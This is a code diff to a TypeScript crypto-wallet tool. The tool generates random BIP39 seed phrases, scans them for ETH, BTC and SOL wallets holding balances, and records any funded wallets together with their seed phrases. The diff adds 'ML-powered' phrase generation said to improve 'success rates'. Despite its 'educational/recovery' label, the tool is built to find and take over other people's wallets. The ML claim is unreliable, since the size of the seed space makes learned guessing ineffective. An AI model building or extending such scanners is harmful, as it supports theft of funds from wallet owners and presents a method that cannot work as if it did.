@@ -1,14 +1,28 @@
 /**
  * Wallet Generator - Create random seed phrases and derive wallet addresses
  * IMPORTANT: This is for educational/recovery purposes only
+ * Now with ML-powered generation for improved success rates
  */
 
 import { BIP39_WORDLIST } from './bip39'
+import type { MLState, GenerationStrategy } from './ml-learning'
 
 /**
  * Generate a random seed phrase (12 or 24 words)
+ * Can optionally use ML state for smarter generation
  */
-export function generateRandomSeedPhrase(wordCount: 12 | 24 = 12): string {
+export async function generateRandomSeedPhrase(
+  wordCount: 12 | 24 = 12,
+  mlState?: MLState,
+  strategy?: GenerationStrategy
+): Promise<string> {
+  // If ML state provided, use smart generation
+  if (mlState && strategy) {
+    const { generateSmartSeedPhrase } = await import('./ml-learning')
+    return generateSmartSeedPhrase(mlState, wordCount, strategy)
+  }
+  
+  // Otherwise use pure random (baseline)
   const words: string[] = []
   
   for (let i = 0; i < wordCount; i++) {
@@ -181,6 +195,7 @@ export async function scanSeedPhrase(
 
 /**
  * Batch scanner - scan multiple seed phrases
+ * Now supports ML-powered generation
  */
 export async function batchScan(
   count: number,
@@ -188,7 +203,9 @@ export async function batchScan(
   walletType: 'ETH' | 'BTC' | 'SOL' | 'both' | 'all',
   useRealAPI = false,
   apiKey?: string,
-  onProgress?: (current: number, total: number, found: number) => void
+  onProgress?: (current: number, total: number, found: number) => void,
+  mlState?: MLState,
+  strategy?: GenerationStrategy
 ): Promise<{
   totalScanned: number
   totalFound: number
@@ -201,6 +218,7 @@ export async function batchScan(
     transactionCount: number
   }>
   scannedAt: string
+  strategyUsed?: GenerationStrategy
 }> {
   const foundWallets: Array<{
     seedPhrase: string
@@ -211,8 +229,10 @@ export async function batchScan(
     transactionCount: number
   }> = []
   
+  const actualStrategy = strategy || 'random'
+  
   for (let i = 0; i < count; i++) {
-    const seedPhrase = generateRandomSeedPhrase(wordCount)
+    const seedPhrase = await generateRandomSeedPhrase(wordCount, mlState, actualStrategy)
     const scanResult = await scanSeedPhrase(seedPhrase, walletType, useRealAPI, apiKey)
     
     // Check if any wallet has balance
@@ -239,7 +259,8 @@ export async function batchScan(
     totalScanned: count,
     totalFound: foundWallets.length,
     foundWallets,
-    scannedAt: new Date().toISOString()
+    scannedAt: new Date().toISOString(),
+    strategyUsed: actualStrategy
   }
 }
 
